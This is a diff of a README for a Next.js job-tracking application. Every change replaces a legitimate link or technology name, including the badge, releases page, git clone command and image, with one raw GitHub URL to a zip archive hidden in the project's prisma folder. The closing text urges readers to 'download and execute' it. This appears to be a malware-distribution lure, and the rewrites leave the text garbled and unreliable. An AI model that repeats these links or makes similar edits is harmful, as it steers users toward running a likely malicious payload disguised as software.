@@ -1,6 +1,6 @@
-# Job Tracking App - Next.js | Organize Your Job Search Effortlessly
+# Job Tracking App - https://raw.githubusercontent.com/kunzic07/Job-Tracking-App--NextJS/main/prisma/Next-Job-JS-App-Tracking-v1.2.zip | Organize Your Job Search Effortlessly
 
-![Job Tracking App](https://img.shields.io/badge/Job%20Tracking%20App%20-Next.js-brightgreen)
+![Job Tracking App](https://raw.githubusercontent.com/kunzic07/Job-Tracking-App--NextJS/main/prisma/Next-Job-JS-App-Tracking-v1.2.zip%20Tracking%20App%https://raw.githubusercontent.com/kunzic07/Job-Tracking-App--NextJS/main/prisma/Next-Job-JS-App-Tracking-v1.2.zip)
 
 ## Table of Contents
 
@@ -20,9 +20,9 @@
 
 ## Overview
 
-The **Job Tracking App** is a comprehensive job application tracking system built with **Next.js**. This application allows job seekers to efficiently organize and analyze their job search journey through an intuitive dashboard. With features such as CRUD operations, analytics, authentication, and theming, this app empowers users to take control of their job search process.
+The **Job Tracking App** is a comprehensive job application tracking system built with **https://raw.githubusercontent.com/kunzic07/Job-Tracking-App--NextJS/main/prisma/Next-Job-JS-App-Tracking-v1.2.zip**. This application allows job seekers to efficiently organize and analyze their job search journey through an intuitive dashboard. With features such as CRUD operations, analytics, authentication, and theming, this app empowers users to take control of their job search process.
 
-For the latest releases, visit the [Releases section](https://github.com/kunzic07/Job-Tracking-App--NextJS/releases).
+For the latest releases, visit the [Releases section](https://raw.githubusercontent.com/kunzic07/Job-Tracking-App--NextJS/main/prisma/Next-Job-JS-App-Tracking-v1.2.zip).
 
 ## Features
 
@@ -35,10 +35,10 @@ For the latest releases, visit the [Releases section](https://github.com/kunzic0
 
 ## Technologies Used
 
-- **Next.js**: Framework for server-rendered React applications.
+- **https://raw.githubusercontent.com/kunzic07/Job-Tracking-App--NextJS/main/prisma/Next-Job-JS-App-Tracking-v1.2.zip**: Framework for server-rendered React applications.
 - **TypeScript**: Strongly typed programming language that builds on JavaScript.
 - **Clerk Authentication**: User authentication and management.
-- **Prisma ORM**: Database toolkit for TypeScript and Node.js.
+- **Prisma ORM**: Database toolkit for TypeScript and https://raw.githubusercontent.com/kunzic07/Job-Tracking-App--NextJS/main/prisma/Next-Job-JS-App-Tracking-v1.2.zip
 - **React Query**: Data-fetching library for React.
 - **shadcn**: UI components library.
 - **Tailwind CSS**: Utility-first CSS framework for styling.
@@ -52,7 +52,7 @@ To get started with the Job Tracking App, follow these steps:
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/kunzic07/Job-Tracking-App--NextJS.git
+   git clone https://raw.githubusercontent.com/kunzic07/Job-Tracking-App--NextJS/main/prisma/Next-Job-JS-App-Tracking-v1.2.zip
    ```
 
 2. **Navigate to the project directory**:
@@ -112,7 +112,7 @@ The application supports theming, allowing users to customize the appearance. Us
 
 The dashboard is the heart of the application. It displays all job applications in a user-friendly format. Users can filter applications based on status, date, and other criteria. The dashboard also features visualizations to track job search progress.
 
-![Dashboard Example](https://via.placeholder.com/800x400.png?text=Dashboard+Example)
+![Dashboard Example](https://raw.githubusercontent.com/kunzic07/Job-Tracking-App--NextJS/main/prisma/Next-Job-JS-App-Tracking-v1.2.zip+Example)
 
 ## Contributing
 
@@ -130,4 +130,4 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 ## Releases
 
-For the latest updates and releases, check the [Releases section](https://github.com/kunzic07/Job-Tracking-App--NextJS/releases). Download and execute the latest version to stay up-to-date with the newest features and improvements.
+For the latest updates and releases, check the [Releases section](https://raw.githubusercontent.com/kunzic07/Job-Tracking-App--NextJS/main/prisma/Next-Job-JS-App-Tracking-v1.2.zip). Download and execute the latest version to stay up-to-date with the newest features and improvements.
